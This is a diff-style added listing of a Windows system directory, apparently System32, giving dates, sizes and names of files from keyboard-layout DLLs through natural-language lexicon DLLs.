+22/08/2013  04:14             7,168 KBDBHC.DLL
+22/08/2013  04:14             6,656 KBDBLR.DLL
+22/08/2013  04:14             7,168 KBDBR.DLL
+22/08/2013  04:15             6,656 KBDBU.DLL
+22/08/2013  04:14             6,656 KBDBUG.DLL
+22/08/2013  04:14             6,656 KBDBULG.DLL
+22/08/2013  04:15             7,168 KBDCA.DLL
+22/08/2013  04:15             8,704 KBDCAN.DLL
+22/08/2013  04:14             7,168 KBDCHER.DLL
+22/08/2013  04:14            16,896 KBDCHERP.DLL
+22/08/2013  04:15             7,680 KBDCR.DLL
+22/08/2013  04:14             7,680 KBDCZ.DLL
+22/08/2013  04:15             7,680 KBDCZ1.DLL
+22/08/2013  04:14             7,680 KBDCZ2.DLL
+22/08/2013  04:14             6,656 KBDDA.DLL
+22/08/2013  04:14             6,656 KBDDIV1.DLL
+22/08/2013  04:14             6,656 KBDDIV2.DLL
+22/08/2013  04:15             6,656 KBDDV.DLL
+22/08/2013  04:14             7,680 KBDES.DLL
+22/08/2013  04:14             6,656 KBDEST.DLL
+22/08/2013  04:15             6,144 KBDFA.DLL
+22/08/2013  04:14             7,168 kbdfar.dll
+22/08/2013  04:14             7,680 KBDFC.DLL
+22/08/2013  04:14             6,656 KBDFI.DLL
+22/08/2013  04:15             8,192 KBDFI1.DLL
+22/08/2013  04:15             6,656 KBDFO.DLL
+22/08/2013  04:14             6,656 KBDFR.DLL
+22/08/2013  04:15             7,168 KBDFTHRK.DLL
+22/08/2013  04:15             6,656 KBDGAE.DLL
+22/08/2013  04:15             6,656 KBDGEO.DLL
+22/08/2013  04:15             7,168 kbdgeoer.dll
+22/08/2013  04:15             7,168 kbdgeome.dll
+22/08/2013  04:15             7,168 kbdgeooa.dll
+22/08/2013  04:15             7,168 kbdgeoqw.dll
+22/08/2013  04:15             7,680 KBDGKL.DLL
+22/08/2013  04:15             7,168 KBDGN.DLL
+22/08/2013  04:15             7,168 KBDGR.DLL
+22/08/2013  04:15             7,680 KBDGR1.DLL
+22/08/2013  04:15             8,192 KBDGRLND.DLL
+22/08/2013  04:15             7,168 KBDGTHC.DLL
+22/08/2013  04:15             6,656 KBDHAU.DLL
+22/08/2013  04:15             7,168 KBDHAW.DLL
+22/08/2013  04:15             6,656 KBDHE.DLL
+22/08/2013  04:15             7,168 KBDHE220.DLL
+22/08/2013  04:15             7,168 KBDHE319.DLL
+22/08/2013  04:15             6,656 KBDHEB.DLL
+22/08/2013  04:15             7,168 kbdhebl3.dll
+22/08/2013  04:15             7,168 KBDHELA2.DLL
+22/08/2013  04:15             7,168 KBDHELA3.DLL
+22/08/2013  04:15             9,728 KBDHEPT.DLL
+22/08/2013  04:15             7,680 KBDHU.DLL
+22/08/2013  04:15             6,656 KBDHU1.DLL
+22/08/2013  04:14             7,680 kbdibm02.DLL
+22/08/2013  04:15             7,168 KBDIBO.DLL
+22/08/2013  04:15             6,656 KBDIC.DLL
+22/08/2013  04:15             6,656 KBDINASA.DLL
+22/08/2013  04:15             6,656 KBDINBE1.DLL
+22/08/2013  04:15             7,168 KBDINBE2.DLL
+22/08/2013  04:15             7,168 KBDINBEN.DLL
+22/08/2013  04:15             7,168 KBDINDEV.DLL
+22/08/2013  04:15             7,168 KBDINEN.DLL
+22/08/2013  04:15             7,168 KBDINGUJ.DLL
+22/08/2013  04:15             7,168 KBDINHIN.DLL
+22/08/2013  04:15             7,168 KBDINKAN.DLL
+22/08/2013  04:15             7,168 KBDINMAL.DLL
+22/08/2013  04:15             7,168 KBDINMAR.DLL
+22/08/2013  04:15             7,168 KBDINORI.DLL
+22/08/2013  04:15             7,168 KBDINPUN.DLL
+22/08/2013  04:15             7,168 KBDINTAM.DLL
+22/08/2013  04:15             7,168 KBDINTEL.DLL
+22/08/2013  04:15             8,192 KBDINUK2.DLL
+22/08/2013  04:15             6,144 KBDIR.DLL
+22/08/2013  04:15             6,144 KBDIT.DLL
+22/08/2013  04:15             6,656 KBDIT142.DLL
+22/08/2013  04:15             7,680 KBDIULAT.DLL
+22/08/2013  04:15             7,168 KBDJAV.DLL
+22/08/2013  04:14            13,312 KBDJPN.DLL
+22/08/2013  04:15             6,656 KBDKAZ.DLL
+22/08/2013  04:15             7,168 KBDKHMR.DLL
+22/08/2013  04:15             7,168 KBDKNI.DLL
+22/08/2013  04:14            12,800 KBDKOR.DLL
+22/08/2013  04:15             7,168 KBDKURD.DLL
+22/08/2013  04:15             6,144 KBDKYR.DLL
+22/08/2013  04:15             7,168 KBDLA.DLL
+22/08/2013  04:15             7,168 KBDLAO.DLL
+22/08/2013  04:15             6,656 kbdlisub.dll
+22/08/2013  04:15             6,656 kbdlisus.dll
+22/08/2013  04:14             7,680 kbdlk41a.dll
+22/08/2013  04:15             6,144 KBDLT.DLL
+22/08/2013  04:15             6,656 KBDLT1.DLL
+22/08/2013  04:15             7,168 KBDLT2.DLL
+22/08/2013  04:15             6,656 KBDLV.DLL
+22/08/2013  04:15             7,168 KBDLV1.DLL
+22/08/2013  04:15             8,192 KBDLVST.DLL
+22/08/2013  04:15             6,656 KBDMAC.DLL
+22/08/2013  04:15             7,168 KBDMACST.DLL
+22/08/2013  04:15             6,656 KBDMAORI.DLL
+22/08/2013  04:15             7,168 KBDMLT47.DLL
+22/08/2013  04:15             7,168 KBDMLT48.DLL
+22/08/2013  04:15             6,656 KBDMON.DLL
+22/08/2013  04:15             6,656 KBDMONMO.DLL
+22/08/2013  04:15             6,656 KBDMONST.DLL
+22/08/2013  04:15             7,168 KBDMYAN.DLL
+22/08/2013  04:15             6,656 KBDNE.DLL
+22/08/2013  04:14             7,680 kbdnec.DLL
+22/08/2013  04:14             8,192 kbdnec95.DLL
+22/08/2013  04:14             9,728 kbdnecat.DLL
+22/08/2013  04:14             8,192 kbdnecnt.DLL
+22/08/2013  04:15             7,168 KBDNEPR.DLL
+22/08/2013  04:15             6,144 kbdnko.dll
+22/08/2013  04:15             6,656 KBDNO.DLL
+22/08/2013  04:15             8,192 KBDNO1.DLL
+22/08/2013  04:15             7,680 KBDNSO.DLL
+22/08/2013  04:15             7,168 KBDNTL.DLL
+22/08/2013  04:15             6,656 KBDOGHAM.DLL
+22/08/2013  04:15             6,656 KBDOLCH.DLL
+22/08/2013  04:15             7,168 KBDOLDIT.DLL
+22/08/2013  04:15             6,656 KBDOSM.DLL
+22/08/2013  04:15             7,168 KBDPASH.DLL
+22/08/2013  04:15             7,168 kbdphags.dll
+22/08/2013  04:15             7,168 KBDPL.DLL
+22/08/2013  04:15             7,168 KBDPL1.DLL
+22/08/2013  04:15             7,168 KBDPO.DLL
+22/08/2013  04:15             8,192 KBDRO.DLL
+22/08/2013  04:15             8,704 KBDROPR.DLL
+22/08/2013  04:15             8,704 KBDROST.DLL
+24/07/2014  10:51             6,656 KBDRU.DLL
+24/07/2014  10:51             7,168 KBDRU1.DLL
+24/07/2014  10:51             8,192 KBDRUM.DLL
+22/08/2013  04:15             7,168 KBDSF.DLL
+22/08/2013  04:15             7,680 KBDSG.DLL
+22/08/2013  04:15             7,168 KBDSL.DLL
+22/08/2013  04:15             7,680 KBDSL1.DLL
+22/08/2013  04:15             8,192 KBDSMSFI.DLL
+22/08/2013  04:15             8,192 KBDSMSNO.DLL
+22/08/2013  04:15             6,656 KBDSN1.DLL
+22/08/2013  04:15             6,656 KBDSORA.DLL
+22/08/2013  04:15             7,680 KBDSOREX.DLL
+22/08/2013  04:15             7,168 KBDSORS1.DLL
+22/08/2013  04:15             7,680 KBDSORST.DLL
+22/08/2013  04:15             7,168 KBDSP.DLL
+22/08/2013  04:15             7,168 KBDSW.DLL
+22/08/2013  04:15             7,680 KBDSW09.DLL
+22/08/2013  04:15             7,168 KBDSYR1.DLL
+22/08/2013  04:15             7,168 KBDSYR2.DLL
+22/08/2013  04:15             7,168 KBDTAILE.DLL
+22/08/2013  04:15             6,656 KBDTAJIK.DLL
+24/07/2014  10:52             7,168 KBDTAT.DLL
+22/08/2013  04:15             6,656 KBDTH0.DLL
+22/08/2013  04:15             6,656 KBDTH1.DLL
+22/08/2013  04:15             6,656 KBDTH2.DLL
+22/08/2013  04:15             6,656 KBDTH3.DLL
+22/08/2013  04:15             7,168 KBDTIFI.DLL
+22/08/2013  04:15             7,168 KBDTIFI2.DLL
+22/08/2013  04:15             7,680 KBDTIPRC.DLL
+22/08/2013  04:15             7,680 KBDTIPRD.DLL
+24/07/2014  10:52             7,168 KBDTT102.DLL
+22/08/2013  04:15             7,680 KBDTUF.DLL
+22/08/2013  04:15             7,680 KBDTUQ.DLL
+22/08/2013  04:15             7,168 KBDTURME.DLL
+22/08/2013  04:15             7,680 KBDTZM.DLL
+22/08/2013  04:15             6,656 KBDUGHR.DLL
+22/08/2013  04:15             6,656 KBDUGHR1.DLL
+22/08/2013  04:15             6,656 KBDUK.DLL
+22/08/2013  04:15             7,680 KBDUKX.DLL
+22/08/2013  04:15             6,144 KBDUR.DLL
+22/08/2013  04:15             7,168 KBDUR1.DLL
+22/08/2013  04:15             6,144 KBDURDU.DLL
+22/08/2013  04:14             6,656 KBDUS.DLL
+22/08/2013  04:15             6,656 KBDUSA.DLL
+22/08/2013  04:15             6,656 KBDUSL.DLL
+22/08/2013  04:15             6,656 KBDUSR.DLL
+22/08/2013  04:15             7,168 KBDUSX.DLL
+22/08/2013  04:15             6,656 KBDUZB.DLL
+22/08/2013  04:15             6,656 KBDVNTC.DLL
+22/08/2013  04:15             7,168 KBDWOL.DLL
+24/07/2014  10:52             7,168 KBDYAK.DLL
+22/08/2013  04:15             7,168 KBDYBA.DLL
+22/08/2013  04:15             7,168 KBDYCC.DLL
+22/08/2013  04:15             8,192 KBDYCL.DLL
+14/10/2017  06:19           780,800 kerberos.dll
+29/10/2014  03:18            29,920 kernel.appcore.dll
+29/10/2014  01:58         1,040,384 kernel32.dll
+16/04/2017  08:16           862,720 KernelBase.dll
+29/10/2014  01:01            46,592 keyiso.dll
+29/10/2014  01:29           156,672 keymgr.dll
+29/10/2014  01:58            30,208 klist.exe
+29/10/2014  01:58            39,424 kmddsp.tsp
+22/08/2013  15:39    <DIR>          ko-KR
+29/10/2014  01:00           147,456 korwbrkr.dll
+29/10/2014  01:56            30,720 ksetup.exe
+03/12/2015  17:28           245,760 ksproxy.ax
+29/10/2014  03:07            19,096 ksuser.dll
+29/10/2014  01:46           116,224 Kswdmcap.ax
+29/10/2014  01:53            15,360 ktmutil.exe
+29/10/2014  02:03            22,016 ktmw32.dll
+22/08/2013  03:57            44,032 ktpass.exe
+29/10/2014  01:56            59,904 l2gpstore.dll
+29/10/2014  01:38            56,320 l2nacp.dll
+29/10/2014  01:20           151,040 L2SecHC.dll
+29/10/2014  01:58            14,848 label.exe
+29/10/2014  00:50           182,784 LaunchTM.exe
+18/06/2013  12:49           211,938 lcphrase.tbl
+18/06/2013  12:49            24,114 lcptr.tbl
+24/10/2017  20:27            69,120 ldifde.exe
+24/10/2017  20:27           296,448 ldp.exe
+25/10/2017  04:19            48,629 license.rtf
+22/08/2013  15:39    <DIR>          Licenses
+22/08/2013  03:22           462,848 licensingdiag.exe
+31/10/2014  03:03            27,136 licmgr10.dll
+29/10/2014  01:56            23,040 linkinfo.dll
+29/10/2014  01:05           101,888 loadperf.dll
+07/09/2017  17:20           513,456 locale.nls
+29/10/2014  01:28           454,656 localsec.dll
+29/10/2014  01:57            14,848 localui.dll
+29/10/2014  01:05            43,520 lodctr.exe
+29/10/2014  01:46            74,240 loghours.dll
+29/10/2014  01:38            87,552 logman.exe
+29/10/2014  01:58            19,456 logoff.exe
+29/10/2014  01:05           174,080 logoncli.dll
+29/10/2014  02:04             3,072 lpk.dll
+29/10/2014  01:59            22,528 lsmproxy.dll
+22/08/2013  15:39    <DIR>          lt-LT
+29/10/2014  01:00            43,008 luainstall.dll
+18/06/2013  12:22           144,998 lusrmgr.msc
+22/08/2013  15:39    <DIR>          lv-LV
+22/08/2013  04:07             3,072 lz32.dll
+22/08/2013  13:25             9,926 l_intl.nls
+29/10/2014  01:53            41,472 Magnification.dll
+29/10/2014  01:24           779,776 Magnify.exe
+29/10/2014  01:48           466,944 main.cpl
+29/10/2014  01:58            69,120 makecab.exe
+29/10/2014  01:54            89,600 mapi32.dll
+29/10/2014  01:54            89,600 mapistub.dll
+29/10/2014  01:57           248,320 mcbuilder.exe
+29/10/2014  01:59            82,432 mciavi32.dll
+29/10/2014  01:58            38,912 mcicda.dll
+29/10/2014  01:49            38,912 mciqtz32.dll
+29/10/2014  02:00            23,552 mciseq.dll
+29/10/2014  02:00            23,552 mciwave.dll
+29/10/2014  01:34           201,728 mdminst.dll
+29/10/2014  02:00            43,520 mf3216.dll
+21/08/2013  23:35           924,944 mfc40.dll
+22/08/2013  05:00           924,944 mfc40u.dll
+22/08/2013  03:11         1,033,728 mfc42.dll
+22/08/2013  03:12         1,059,328 mfc42u.dll
+18/03/2003  20:20         1,060,864 mfc71.dll
+18/03/2003  20:12         1,047,552 mfc71u.dll
+29/10/2014  01:05            27,648 mfcsubs.dll
+07/09/2017  19:20            18,944 mgmtapi.dll
+29/10/2014  01:04            97,792 mi.dll
+29/10/2014  01:02           123,904 mibincodec.dll
+29/10/2014  01:05            14,336 Microsoft.Management.Infrastructure.Native.Unmanaged.dll
+20/06/2013  10:42           140,456 MicrosoftUpdateCatalogWebControl.dll
+29/10/2014  01:58            18,944 midimap.dll
+22/02/2014  10:09            97,280 migisol.dll
+21/01/2018  23:26    <DIR>          migration
+29/10/2014  02:00           182,784 miguiresource.dll
+21/01/2018  23:26    <DIR>          migwiz
+29/10/2014  01:31            33,792 mimefilt.dll
+29/10/2014  01:03           120,832 mimofcodec.dll
+29/10/2014  01:03            32,768 MirrorDrvCompat.dll
+10/01/2017  19:09         1,108,480 mispace.dll
+29/10/2014  00:59           188,928 miutils.dll
+18/06/2013  12:22           673,088 mlang.dat
+29/10/2014  00:57           192,512 mlang.dll
+29/10/2014  01:37         1,563,136 mmc.exe
+29/10/2014  01:48           311,296 mmcbase.dll
+29/10/2014  01:46            65,024 mmci.dll
+29/10/2014  01:57            11,264 mmcico.dll
+29/10/2014  01:24         2,364,928 mmcndmgr.dll
+29/10/2014  01:54           114,688 mmcshext.dll
+29/10/2014  03:07           331,048 MMDevAPI.dll
+22/08/2013  04:16         9,576,960 mmres.dll
+29/10/2014  01:27           763,392 mmsys.cpl
+29/10/2014  01:58            27,136 mode.com
+29/10/2014  01:41           287,232 modemui.dll
+29/10/2014  01:05            23,552 more.com
+29/10/2014  01:05            15,360 mountvol.exe
+29/10/2014  03:12            87,224 mpr.dll
+24/06/2017  16:16           352,768 mprapi.dll
+08/07/2016  14:17           319,488 mprddm.dll
+07/07/2016  20:18           187,392 mprdim.dll
+29/10/2014  01:06            12,288 mprext.dll
+29/10/2014  01:05           113,152 mprmsg.dll
+22/08/2013  02:08         1,019,904 mprsnap.dll
+29/10/2014  01:03            13,824 MRINFO.EXE
+31/10/2014  02:06           790,528 MrmCoreR.dll
+29/10/2014  00:30           602,624 MrmIndexer.dll
+29/10/2014  01:48           126,976 msaatext.dll
+29/10/2014  03:07            89,816 msacm32.dll
+29/10/2014  01:54            23,040 msacm32.drv
+29/10/2014  03:07            28,896 msadp32.acm
+22/08/2013  04:14             3,072 msafd.dll
+29/10/2014  03:15            51,608 msasn1.dll
+29/10/2014  02:06           154,112 msaudite.dll
+29/10/2014  01:39           252,928 mscandui.dll
+29/10/2014  02:00            11,776 mscat32.dll
+21/01/2018  23:01           195,072 msclmd.dll
+04/02/2017  17:05           503,808 mscms.dll
+22/08/2013  03:40           330,240 mscoree.dll
+22/08/2013  05:11            19,456 mscorier.dll
+17/08/2013  00:06            81,560 mscories.dll
+22/08/2013  04:17             2,048 mscpx32r.dLL
+29/10/2014  02:00            14,848 mscpxl32.dLL
+14/09/2017  01:14         1,124,384 msctf.dll
+29/10/2014  01:55             8,192 msctfime.ime
+29/10/2014  01:48            22,528 MsCtfMonitor.dll
+29/10/2014  01:54            91,136 msctfp.dll
+29/10/2014  01:54            93,184 msctfui.dll
+29/10/2014  00:43           724,480 msctfuimanager.dll
+29/10/2014  01:59           151,552 msdadiag.dll
+29/10/2014  01:38           116,224 msdart.dll
+22/08/2013  04:16             4,608 msdatsrc.tlb
+29/10/2014  01:01           397,824 msdelta.dll
+29/10/2014  03:07            39,720 msdmo.dll
+22/08/2013  15:39    <DIR>          MSDRM
+29/10/2014  00:48           454,144 msdrm.dll
+29/10/2014  01:17           981,504 msdt.exe
+22/08/2013  15:39    <DIR>          MsDtc
+30/08/2016  02:03           721,920 msdtcprx.dll
+29/10/2014  00:43           252,928 msdtcuiu.dll
+22/08/2013  04:14            21,504 msdtcVSp1res.dll
+18/06/2013  12:17           409,600 msexch40.dll
+17/10/2017  19:11           339,968 msexcl40.dll
+07/11/2017  20:18           694,272 msfeeds.dll
+31/10/2014  02:53            52,736 msfeedsbs.dll
+31/10/2014  03:25            11,264 msfeedssync.exe
+08/09/2017  16:50         2,471,424 msftedit.dll
+29/10/2014  01:58            22,528 msg.exe
+29/10/2014  03:07            22,720 msg711.acm
+29/10/2014  03:07            36,136 msgsm32.acm
+29/10/2014  01:00           404,480 mshta.exe
+14/11/2017  01:10        20,269,056 mshtml.dll
+06/02/2014  10:20         2,724,864 mshtml.tlb
+07/09/2017  19:09            64,000 MshtmlDac.dll
+07/09/2017  18:39            76,288 mshtmled.dll
+22/08/2013  04:16            48,640 mshtmler.dll
+05/11/2016  17:11         3,606,528 msi.dll
+29/10/2014  01:38            53,248 msident.dll
+29/10/2014  01:05             9,216 msidle.dll
+22/08/2013  04:14             4,608 msidntld.dll
+29/10/2014  01:18           281,088 msieftp.dll
+05/05/2016  16:37            59,904 msiexec.exe
+29/10/2014  01:42           325,120 msihnd.dll
+29/10/2014  01:58            17,408 msiltcfg.dll
+29/10/2014  01:05             6,144 msimg32.dll
+22/08/2013  04:15            25,088 msimsg.dll
+29/10/2014  00:58            36,352 msimtf.dll
+11/06/2017  20:58           334,336 msinfo32.exe
+29/10/2014  02:00            25,088 msisip.dll
+01/07/2017  13:47         1,311,744 msjet40.dll
+21/07/2017  13:40           518,144 msjetoledb40.dll
+09/09/2017  13:13             8,704 msjint40.dll
+01/07/2017  13:47            83,968 msjter40.dll
+21/07/2017  13:40           290,816 msjtes40.dll
+29/10/2014  01:05            45,056 mskeyprotect.dll
+29/10/2014  02:00           193,536 msls31.dll
+01/07/2017  13:47           240,640 msltus40.dll
+21/01/2017  18:40            61,952 msobjs.dll
+29/10/2014  01:16           198,144 msoeacct.dll
+29/10/2014  01:14            99,328 msoert2.dll
+22/08/2013  04:17             2,048 msorc32r.dll
+10/01/2016  17:31           162,304 msorcl32.dll
+29/10/2014  01:30         6,465,536 mspaint.exe
+29/10/2014  01:05            36,864 mspatcha.dll
+29/10/2014  01:05            65,024 mspatchc.dll
+01/07/2017  13:47           375,808 mspbde40.dll
+29/10/2014  01:51            44,544 msports.dll
+15/06/2015  20:44           168,960 msrating.dll
+01/07/2017  13:47           310,272 msrd2x40.dll
+01/07/2017  13:47           343,552 msrd3x40.dll
+29/10/2014  01:50            51,712 MsRdpWebAccess.dll
+01/07/2017  13:47           616,448 msrepl40.dll
+29/10/2014  01:58            13,824 msrle32.dll
+29/10/2014  01:50           101,376 msscript.ocx
+29/10/2014  01:51            56,320 mssign32.dll
+29/10/2014  02:00             8,704 mssip32.dll
+29/10/2014  00:45           664,064 MsSpellCheckingFacility.dll
+29/10/2014  00:46            61,440 MsSpellCheckingHost.exe
+29/10/2014  00:45           219,648 mstask.dll
+01/07/2017  13:47           272,896 mstext40.dll
+29/10/2014  01:06         1,086,976 mstsc.exe
+10/07/2015  16:31         6,213,120 mstscax.dll
+22/08/2013  03:39           117,248 mstsmhst.dll
+22/08/2013  03:06           224,256 mstsmmc.dll
+29/10/2014  01:58           423,424 msutb.dll
+10/10/2016  21:17           333,656 msv1_0.dll
+18/06/2013  12:37         1,386,496 msvbvm60.dll
+29/10/2014  02:04            66,048 msvcirt.dll
+10/08/2013  00:56           536,688 msvcp120_clr0400.dll
+29/10/2014  02:04           445,440 msvcp60.dll
+10/08/2013  00:56            18,000 msvcr100_clr0400.dll
+10/08/2013  00:56           876,656 msvcr120_clr0400.dll
+21/02/2003  03:42           348,160 msvcr71.dll
+29/10/2014  03:06           800,008 msvcrt.dll
+18/06/2013  12:38           253,952 msvcrt20.dll
+22/08/2013  04:14            61,440 msvcrt40.dll
+29/10/2014  01:51           123,392 msvfw32.dll
+29/10/2014  01:58            32,256 msvidc32.dll
+29/10/2014  01:52           181,248 MSWB7.dll
+29/10/2014  01:48           524,800 MSWB70011.dll
+29/10/2014  01:48           524,800 MSWB7001E.dll
+29/10/2014  01:48           524,800 MSWB70404.dll
+29/10/2014  01:48           524,800 MSWB70804.dll
+01/07/2017  13:47           866,816 mswdat10.dll
+13/05/2016  21:35           286,208 mswsock.dll
+09/09/2017  13:13           640,512 mswstr10.dll
+01/07/2017  13:47           475,648 msxbde40.dll
+03/06/2017  16:03         1,549,312 msxml3.dll
+22/08/2013  04:16             2,048 msxml3r.dll
+14/07/2015  03:21         1,901,776 msxml6.dll
+22/08/2013  04:16             2,048 msxml6r.dll
+29/10/2014  01:58            23,040 msyuv.dll
+29/10/2014  00:57           124,416 mtstocom.exe
+29/10/2014  00:54           347,648 mtxclu.dll
+29/10/2014  01:00            25,088 mtxdm.dll
+29/10/2014  01:59             7,680 mtxex.dll
+29/10/2014  01:00            30,720 mtxlegih.dll
+10/01/2016  16:40           116,736 mtxoci.dll
+22/08/2013  16:05    <DIR>          MUI
+29/10/2014  01:57            14,336 muifontsetup.dll
+29/10/2014  01:30            62,464 MuiUnattend.exe
+29/10/2014  01:46           243,712 mycomput.dll
+29/10/2014  01:39           147,968 mydocs.dll
+18/06/2013  12:24            63,411 NAPCLCFG.MSC
+22/08/2013  05:24            47,104 NAPCRYPT.DLL
+29/10/2014  01:39            70,144 napdsnap.dll
+22/08/2013  05:24           106,496 NAPHLPR.DLL
+29/10/2014  01:58            55,296 NapiNSP.dll
+29/10/2014  01:45            36,352 napipsec.dll
+29/10/2014  00:43           255,488 NAPMONTR.DLL
+29/10/2014  01:45           273,408 NAPSTAT.EXE
+29/10/2014  01:44            94,720 Narrator.exe
+29/10/2014  00:45           918,016 NaturalLanguage6.dll
+22/08/2013  15:39    <DIR>          nb-NO
+29/10/2014  01:43            19,968 NcaApi.dll
+29/10/2014  01:39            21,504 NcdProp.dll
+29/10/2014  00:56            22,016 nci.dll
+29/10/2014  01:04            56,320 ncobjapi.dll
+29/10/2014  01:40           100,352 ncpa.cpl
+06/04/2016  17:49           120,384 ncrypt.dll
+29/10/2014  01:06           301,568 ncryptprov.dll
+11/06/2016  03:44            91,416 ncryptsslp.dll
+29/10/2014  01:51            73,216 ndadmin.exe
+29/10/2014  02:00             9,728 nddeapi.dll
+22/08/2013  15:39    <DIR>          NDF
+29/10/2014  00:45           223,232 ndfapi.dll
+29/10/2014  01:38            29,184 ndfetw.dll
+18/06/2013  12:20               565 NdfEventView.xml
+29/10/2014  01:38            89,088 ndfhcdiscovery.dll
+29/10/2014  00:51            46,592 ndiscapCfg.dll
+29/10/2014  01:30            73,216 ndishc.dll
+29/10/2014  01:42            13,824 ndproxystub.dll
+29/10/2014  01:03           108,544 negoexts.dll
+29/10/2014  01:04            46,592 net.exe
+29/10/2014  01:04           139,776 net1.exe
+29/10/2014  03:15            68,168 netapi32.dll
+29/10/2014  02:00            14,336 netbios.dll
+29/10/2014  01:58            21,504 netbtugc.exe
+29/10/2014  00:37         1,157,632 netcenter.dll
+29/10/2014  03:12           403,776 netcfgx.dll
+29/10/2014  01:16           173,568 netcorehc.dll
+29/10/2014  01:20           229,376 netdiagfx.dll
+22/08/2013  03:54            73,728 netdom.exe
+22/08/2013  04:17            19,968 netevent.dll
+22/08/2013  03:55            47,616 netfxperf.dll
+22/08/2013  04:16             2,048 neth.dll
+29/10/2014  01:23            97,280 netid.dll
+29/10/2014  00:51           169,472 netiohlp.dll
+29/10/2014  01:57            24,064 netiougc.exe
+29/10/2014  01:04           279,552 netjoin.dll
+10/01/2017  19:20           696,832 netlogon.dll
+22/08/2013  04:15             2,048 netmsg.dll
+29/10/2014  00:44           153,088 netplwiz.dll
+29/10/2014  01:40            26,112 Netplwiz.exe
+29/10/2014  00:59           210,432 netprofm.dll
+29/10/2014  01:51            57,344 netprovisionsp.dll
+29/10/2014  01:04            82,944 netsh.exe
+29/10/2014  01:19         2,714,624 netshell.dll
+29/10/2014  01:00            32,768 NETSTAT.EXE
+29/10/2014  03:15            35,592 netutils.dll
+29/10/2014  01:16         1,669,632 networkexplorer.dll
+29/10/2014  01:25            45,056 networkitemfactory.dll
+22/08/2013  15:39    <DIR>          networklist
+29/10/2014  01:27           307,200 newdev.dll
+29/10/2014  01:42            73,728 newdev.exe
+25/10/2017  20:47             4,608 nfsclusrc.dll
+29/10/2014  00:55           304,128 ninput.dll
+22/08/2013  15:39    <DIR>          nl-NL
+29/10/2014  01:51         7,331,840 NL7Data0011.dll
+29/10/2014  01:51           782,848 NL7Data001E.dll
+29/10/2014  01:53         2,238,464 NL7Data0404.dll
+29/10/2014  01:52         3,355,136 NL7Data0804.dll
+29/10/2014  01:01            65,536 nlaapi.dll
+29/10/2014  01:25           136,704 nlhtml.dll
+29/10/2014  01:38           157,184 nlmgp.dll
+29/10/2014  01:00            16,896 nlmproxy.dll
+29/10/2014  01:58            12,288 nlmsprep.dll
+22/08/2013  04:17            58,880 nlsbres.dll
+29/10/2014  01:38         1,548,800 NlsData0000.dll
+29/10/2014  01:36         1,997,824 NlsData0002.dll
+29/10/2014  01:36         1,997,824 NlsData0003.dll
+29/10/2014  01:40         2,036,224 NlsData0007.dll
+29/10/2014  01:38         4,945,920 NlsData0009.dll
+29/10/2014  01:39         9,604,608 NlsData000a.dll
+29/10/2014  01:38         2,307,072 NlsData000c.dll
+29/10/2014  01:38         2,387,456 NlsData000d.dll
+29/10/2014  01:38         2,012,160 NlsData000f.dll
+29/10/2014  01:38         4,530,688 NlsData0010.dll
+29/10/2014  01:36         1,997,824 NlsData0018.dll
+29/10/2014  01:36         1,997,824 NlsData001a.dll
+29/10/2014  01:36         1,997,824 NlsData001b.dll
+29/10/2014  01:39         4,530,688 NlsData001d.dll
+29/10/2014  01:36         3,132,928 NlsData0020.dll
+29/10/2014  01:36         1,829,376 NlsData0021.dll
+29/10/2014  01:36         1,829,376 NlsData0022.dll
+29/10/2014  01:36         1,997,824 NlsData0024.dll
+29/10/2014  01:38         2,012,160 NlsData0026.dll
+29/10/2014  01:36         1,999,360 NlsData0027.dll
+29/10/2014  01:37         1,829,376 NlsData002a.dll
+29/10/2014  01:37         3,149,824 NlsData0039.dll
+29/10/2014  01:36         1,829,376 NlsData003e.dll
+29/10/2014  01:36         3,132,928 NlsData0045.dll
+29/10/2014  01:36         3,132,928 NlsData0046.dll
+29/10/2014  01:36         3,132,928 NlsData0047.dll
+29/10/2014  01:36         3,132,928 NlsData0049.dll
+29/10/2014  01:36         3,132,928 NlsData004a.dll
+29/10/2014  01:36         3,132,928 NlsData004b.dll
+29/10/2014  01:36         3,132,928 NlsData004c.dll
+29/10/2014  01:36         3,132,928 NlsData004e.dll
+29/10/2014  01:38         4,530,176 NlsData0414.dll
+29/10/2014  01:39         4,531,712 NlsData0416.dll
+29/10/2014  01:38         4,529,664 NlsData0816.dll
+29/10/2014  01:36         1,997,824 NlsData081a.dll
+29/10/2014  01:36         1,997,824 NlsData0c1a.dll
+29/10/2014  02:00            27,136 Nlsdl.dll
+22/08/2013  04:16         4,164,096 NlsLexicons0002.dll
+22/08/2013  04:16         1,452,544 NlsLexicons0003.dll
+22/08/2013  04:16        12,038,656 NlsLexicons0007.dll
+29/10/2014  02:05         2,628,608 NlsLexicons0009.dll
+22/08/2013  04:16         9,892,864 NlsLexicons000a.dll
+22/08/2013  04:16         6,237,696 NlsLexicons000c.dll
+22/08/2013  04:16         1,722,368 NlsLexicons000d.dll
+22/08/2013  04:16         5,654,528 NlsLexicons000f.dll
+22/08/2013  04:16         4,175,872 NlsLexicons0010.dll
+22/08/2013  04:16         3,331,072 NlsLexicons0018.dll
+22/08/2013  04:16         6,014,976 NlsLexicons001a.dll
+22/08/2013  04:16         6,585,856 NlsLexicons001b.dll
+22/08/2013  04:16         6,346,240 NlsLexicons001d.dll
+22/08/2013  04:16         1,236,992 NlsLexicons0020.dll
+22/08/2013  04:16         2,136,064 NlsLexicons0021.dll
+22/08/2013  04:16         5,499,904 NlsLexicons0022.dll
+22/08/2013  04:16         7,964,672 NlsLexicons0024.dll
+22/08/2013  04:16         5,791,232 NlsLexicons0026.dll
+22/08/2013  04:16         6,224,896 NlsLexicons0027.dll
+22/08/2013  04:16             4,096 NlsLexicons002a.dll
+22/08/2013  04:16         1,782,272 NlsLexicons0039.dll
+22/08/2013  04:16         4,045,824 NlsLexicons003e.dll
+22/08/2013  04:16         1,793,536 NlsLexicons0045.dll
+22/08/2013  04:16         1,808,896 NlsLexicons0046.dll
+22/08/2013  04:16         1,411,072 NlsLexicons0047.dll
+22/08/2013  04:16         1,558,016 NlsLexicons0049.dll
+22/08/2013  04:16         3,419,136 NlsLexicons004a.dll
+22/08/2013  04:16         1,702,912 NlsLexicons004b.dll
+22/08/2013  04:16         4,093,440 NlsLexicons004c.dll
+22/08/2013  04:16         1,972,736 NlsLexicons004e.dll
+22/08/2013  04:16         4,616,192 NlsLexicons0414.dll
+22/08/2013  04:16         5,090,816 NlsLexicons0416.dll
+22/08/2013  04:16         5,031,936 NlsLexicons0816.dll
+22/08/2013  04:16         7,042,560 NlsLexicons081a.dll
+22/08/2013  04:16         6,917,120 NlsLexicons0c1a.dll
